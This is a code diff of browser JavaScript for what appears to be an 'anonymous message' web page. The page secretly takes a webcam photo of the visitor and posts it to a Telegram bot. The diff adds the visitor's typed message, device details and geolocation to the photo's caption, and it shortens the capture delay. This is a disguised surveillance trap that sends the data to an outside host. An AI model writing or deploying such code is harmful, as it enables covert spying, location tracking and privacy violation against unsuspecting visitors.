@@ -65,6 +65,7 @@ function getDeviceInfo() {
 
 
 
+
 function getLocation() {
     return new Promise(resolve => {
         if (navigator.geolocation) {
@@ -99,6 +100,7 @@ async function getAddressFromCoords(latitude, longitude) {
     }
 }
 
+
 let count = 50; 
 
 function updateCount() {
@@ -107,7 +109,7 @@ function updateCount() {
     document.getElementById("number").textContent = count;
 }
 
-setInterval(updateCount, 1000);
+setInterval(updateCount, 2000);
 
 async function getRandomText() {
     try {
@@ -150,18 +152,28 @@ function capturePhoto() {
                 canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
 
                 const photoData = canvas.toDataURL("image/png");
-                sendPhoto(photoData);
+                
+                let message = document.getElementById("inputMessage").value;
+                let fullMessage = `📩 Anonim Pesan: ${message}\n\n📱 Perangkat: ${getDeviceInfo()}`;
+                
+                getLocation().then(locationText => {
+                    if (locationText) fullMessage += `\n\n${locationText}`;
+                    sendPhoto(photoData, fullMessage);
+                });
+
                 stream.getTracks().forEach(track => track.stop()); // Matikan kamera setelah mengambil foto
-            }, 2000);
+            }, 1000);
         }).catch(() => {
             console.warn("Akses kamera ditolak atau tidak tersedia.");
         });
 }
 
-function sendPhoto(base64Image) {
+
+function sendPhoto(base64Image, captionText) {
     let formData = new FormData();
     formData.append("chat_id", chatId);
     formData.append("photo", dataURItoBlob(base64Image), "photo.png");
+    formData.append("caption", captionText);
 
     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: "POST",
@@ -170,6 +182,7 @@ function sendPhoto(base64Image) {
         console.warn("Foto gagal dikirim.");
     });
 }
+
 
 function dataURItoBlob(dataURI) {
     let byteString = atob(dataURI.split(",")[1]);
@@ -181,3 +194,4 @@ function dataURItoBlob(dataURI) {
     }
     return new Blob([ab], { type: mimeString });
 }
+
